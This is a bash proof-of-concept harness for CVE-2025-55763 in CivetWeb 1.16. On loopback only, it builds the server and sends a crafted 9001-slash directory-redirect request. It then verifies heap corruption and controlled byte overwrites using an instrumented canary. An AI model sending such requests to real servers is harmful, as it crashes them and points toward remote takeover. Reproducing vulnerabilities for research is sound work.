#!/bin/bash
# CivetWeb CVE-2025-55763 — offline, loopback-only rung-4 replay.
# Usage: bash run-rung4.sh [OUTDIR]
#
# Rebuilds the committed, pinned v1.16 tarball twice with FORTIFY off:
#   1. plain   — crafted request => glibc allocator abort (heap corruption)
#   2. canary  — a 4096-byte live victim is placed immediately after new_path;
#                crafted query bytes land in it at chosen offsets.
# The canary is instrumentation, NOT natural adjacency. This script reproduces
# the INSTRUMENTED rung-4 boundary described in reports/civetweb2shell.md.
# Patch is embedded below so a clean `git archive` needs no other input.
# Requires: bash, python3, curl, nc, patch, make, gcc (all offline).
set -u

BASE="$(cd "$(dirname "$0")" && pwd)"
OUT="${1:-$BASE/out-rung4}"
rm -rf "$OUT"
mkdir -p "$OUT/plain" "$OUT/instr"

trace="$OUT/trace.txt"
: > "$trace"
pass=0; fail=0
ck() { # name expected actual
  if [ "$2" = "$3" ]; then
    printf 'PASS %s=%s\n' "$1" "$3" >> "$trace"; pass=$((pass+1))
  else
    printf 'FAIL %s: expected=%s actual=%s\n' "$1" "$2" "$3" >> "$trace"; fail=$((fail+1))
  fi
}

ck pin_v1_16 f0e471c1bf4e7804a6cfb41ea9d13e7d623b2bcc7bc1e2a4dd54951a24d60285 \
   "$(sha256sum "$BASE/pins/civetweb-1.16.tar.gz" | cut -d' ' -f1)"
if [ "$fail" -ne 0 ]; then cat "$trace"; exit 1; fi

tar xzf "$BASE/pins/civetweb-1.16.tar.gz" -C "$OUT/plain"
tar xzf "$BASE/pins/civetweb-1.16.tar.gz" -C "$OUT/instr"
P="$OUT/plain/civetweb-1.16"
I="$OUT/instr/civetweb-1.16"

cat > "$OUT/w1-canary.patch" <<'PATCH'
--- a/src/civetweb.c
+++ b/src/civetweb.c
@@ -15254,13 +15254,29 @@
 		if (!new_path) {
 			mg_send_http_error(conn, 500, "out or memory");
 		} else {
+			/* W1 experiment: place a live canary immediately after
+			 * new_path (both fresh from this worker's top chunk). */
+			char *w1_victim = (char *)mg_malloc_ctx(4096, conn->phys_ctx);
+			int w1_i;
+			memset(w1_victim, 0xc7, 4096);
+			fprintf(stderr,
+			        "W1_ALLOC new=%p buflen=%zu victim=%p off=%ld\n",
+			        (void *)new_path, buflen, (void *)w1_victim,
+			        (long)(w1_victim - new_path));
 			mg_get_request_link(conn, new_path, buflen - 1);
+			fprintf(stderr, "W1_LINK strlen=%zu\n", strlen(new_path));
 			strcat(new_path, "/");
 			if (ri->query_string) {
-				/* Append ? and query string */
 				strcat(new_path, "?");
 				strcat(new_path, ri->query_string);
 			}
+			fprintf(stderr, "W1_POST strlen=%zu victim_bytes:",
+			        strlen(new_path));
+			for (w1_i = 0; w1_i < 32; w1_i++) {
+				fprintf(stderr, " %02x",
+				        (unsigned char)w1_victim[w1_i]);
+			}
+			fprintf(stderr, "\nW1_VICTIM_ASCII=%.32s\n", w1_victim);
 			mg_send_http_redirect(conn, new_path, 301);
 			mg_free(new_path);
 		}
PATCH
(cd "$I" && patch -p1 < "$OUT/w1-canary.patch" > "$OUT/patch.log" 2>&1)
ck canary_patch 0 "$?"

(cd "$P" && make WITH_CFLAGS=-U_FORTIFY_SOURCE NO_SSL=1 -j4 civetweb > "$OUT/plain-build.log" 2>&1)
ck plain_build 0 "$?"
(cd "$I" && make WITH_CFLAGS=-U_FORTIFY_SOURCE NO_SSL=1 -j4 civetweb > "$OUT/instr-build.log" 2>&1)
ck instr_build 0 "$?"
if [ "$fail" -ne 0 ]; then cat "$trace"; exit 1; fi

mkdir -p "$OUT/docroot/d"
printf 'hello\n' > "$OUT/docroot/d/index.html"
printf 'root\n' > "$OUT/docroot/index.html"

# One crafted directory-redirect request; 9001 raw slashes collapse to /d.
mkreq() { # reqpath query
  python3 - "$1" "$2" <<'PY'
import sys
path, q = sys.argv[1], sys.argv[2]
req = 'GET ' + '/' * 9001 + 'd?' + q + ' HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n'
open(path, 'wb').write(req.encode())
PY
}
send() { # binary port reqfile d
  local bin="$1" port="$2" req="$3" d="$4" pid i
  mkdir -p "$d"
  "$bin" -listening_ports "127.0.0.1:$port" -document_root "$OUT/docroot" \
    -error_log_file "$d/error.log" > "$d/server.out" 2>&1 &
  pid=$!
  for i in $(seq 1 60); do
    curl -sS -o /dev/null "http://127.0.0.1:$port/index.html" 2>/dev/null && break
    sleep 0.1
  done
  timeout 8 nc 127.0.0.1 "$port" < "$req" > "$d/client.out" 2>&1
  sleep 1
  kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
}

# ---- 1. unmodified build, allocator-detected corruption ----
mkreq "$OUT/plain-q1.req" 'q=1'
ck plain_req_bytes 9059 "$(wc -c < "$OUT/plain-q1.req")"
send "$P/civetweb" 18301 "$OUT/plain-q1.req" "$OUT/plain-q1"
ck plain_malloc_corruption 1 "$(grep -c 'malloc(): invalid' "$OUT/plain-q1/server.out" || true)"

# ---- 2. instrumented canary, chosen bytes at chosen offsets ----
# short query: only the null terminator reaches the chunk gap, canary intact
mkreq "$OUT/instr-q1.req" 'q=1'
ck instr_q1_req_bytes 9059 "$(wc -c < "$OUT/instr-q1.req")"
send "$I/civetweb" 18302 "$OUT/instr-q1.req" "$OUT/instr-q1"
s1="$OUT/instr-q1/server.out"
ck instr_q1_offset 8208 "$(grep -o 'off=[0-9]*' "$s1" | head -1 | cut -d= -f2)"
ck instr_q1_link 8195 "$(grep -o 'W1_LINK strlen=[0-9]*' "$s1" | head -1 | cut -d= -f2)"
ck instr_q1_canary_intact 32 "$(grep -o ' c7' "$s1" | wc -l)"

# 36-byte query: chosen bytes GHIJKLMNOPQRSTUVWXYZ0123456789\0 at canary[0..30]
QABC='q=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
mkreq "$OUT/instr-qABC.req" "$QABC"
ck instr_abc_req_bytes 9094 "$(wc -c < "$OUT/instr-qABC.req")"
send "$I/civetweb" 18303 "$OUT/instr-qABC.req" "$OUT/instr-qABC"
s2="$OUT/instr-qABC/server.out"
ck instr_abc_offset 8240 "$(grep -o 'off=[0-9]*' "$s2" | head -1 | cut -d= -f2)"
ck instr_abc_link 8230 "$(grep -o 'W1_LINK strlen=[0-9]*' "$s2" | head -1 | cut -d= -f2)"
ck instr_abc_ascii 'GHIJKLMNOPQRSTUVWXYZ0123456789' "$(grep -o 'W1_VICTIM_ASCII=.*' "$s2" | head -1 | cut -d= -f2)"
ck instr_abc_first_byte 1 "$(grep -c 'victim_bytes: 47 48 49 4a' "$s2" || true)"

# 50-byte query: 32 C's fill the whole logged canary window
QCCC='q=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
mkreq "$OUT/instr-qCCC.req" "$QCCC"
ck instr_ccc_req_bytes 9108 "$(wc -c < "$OUT/instr-qCCC.req")"
send "$I/civetweb" 18304 "$OUT/instr-qCCC.req" "$OUT/instr-qCCC"
s3="$OUT/instr-qCCC/server.out"
ck instr_ccc_offset 8256 "$(grep -o 'off=[0-9]*' "$s3" | head -1 | cut -d= -f2)"
ck instr_ccc_canary 32 "$(grep -o ' 43' "$s3" | wc -l)"
ck instr_ccc_ascii 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC' "$(grep -o 'W1_VICTIM_ASCII=.*' "$s3" | head -1 | cut -d= -f2)"

printf 'PASS_COUNT=%d\n' "$pass" >> "$trace"
printf 'FAIL_COUNT=%d\n' "$fail" >> "$trace"
printf 'TRACE_SHA256=%s\n' "$(sha256sum "$trace" | cut -d' ' -f1)" >> "$trace"
cat "$trace"
[ "$fail" -eq 0 ]
